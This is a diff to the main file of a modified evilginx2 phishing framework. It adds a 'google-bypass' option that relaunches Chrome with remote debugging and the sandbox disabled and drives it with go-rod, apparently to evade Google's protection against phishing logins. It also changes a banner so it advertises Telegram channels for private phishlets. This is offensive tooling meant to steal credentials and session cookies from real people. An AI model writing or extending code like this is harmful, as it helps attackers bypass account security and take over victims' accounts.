@@ -5,15 +5,18 @@ import (
 	"fmt"
 	_log "log"
 	"os"
+	"os/exec"
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"bytes"
 
 	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 	"go.uber.org/zap"
+	"github.com/go-rod/rod/lib/launcher"
 
 	"github.com/fatih/color"
 )
@@ -39,9 +42,65 @@ func showAd() {
 	lred := color.New(color.FgHiRed)
 	lyellow := color.New(color.FgHiYellow)
 	white := color.New(color.FgHiWhite)
-	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Private Phishlets & Tutorials"), lyellow.Sprint("https://t.me/eviltwist/"), white.Sprint("(Blurry Banks)"))
+	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Telegram Username & Channel"), lyellow.Sprint("https://t.me/eviltwist/"), white.Sprint("(https://t.me/Get_it_or_leave_it)"))
 	log.Info("%s", message)
 }
+
+	var google_bypass = flag.Bool("google-bypass", false, "Enable Google Bypass")
+
+	func init() {
+		flag.Parse()
+		if *google_bypass {
+			// Ensure the DISPLAY environment variable is set
+			display := ":99"
+			if disp := getenv("DISPLAY", ""); disp != "" {
+				display = disp
+			}
+
+			// Kill any existing Chrome instances with remote debugging on port 9222
+			exec.Command("pkill", "-f", "google-chrome.*--remote-debugging-port=9222").Run()
+			log.Debug("Killed all google-chrome instances running in debug mode on port 9222")
+
+			// Start google-chrome in debug mode
+			cmd := exec.Command("google-chrome", "--remote-debugging-port=9222", "--no-sandbox")
+
+			// Capture standard output and error
+			var out bytes.Buffer
+			var stderr bytes.Buffer
+			cmd.Stdout = &out
+			cmd.Stderr = &stderr
+
+			// Set environment variables if necessary (e.g., DISPLAY)
+			cmd.Env = append(cmd.Env, fmt.Sprintf("DISPLAY=%s", display))
+
+			err := cmd.Start()
+			if err != nil {
+				log.Error("Failed to start google-chrome in debug mode: %v", err)
+				log.Error("Command output: %s", stderr.String())
+				return
+			}
+			log.Debug("Started google-chrome in debug mode on port 9222")
+
+			// Optionally wait for the command to finish and capture its output
+			go func() {
+				err = cmd.Wait()
+				if err != nil {
+					log.Error("google-chrome process exited with error: %v", err)
+					log.Error("Command output: %s", stderr.String())
+				}
+			}()
+			// Ensure a browser instance is available
+			launcher.NewBrowser().MustGet()
+		}
+	}
+
+	func getenv(key, fallback string) string {
+		value := os.Getenv(key)
+		if value == "" {
+			return fallback
+		}
+		return value
+	}
 
 func main() {
 	flag.Parse()
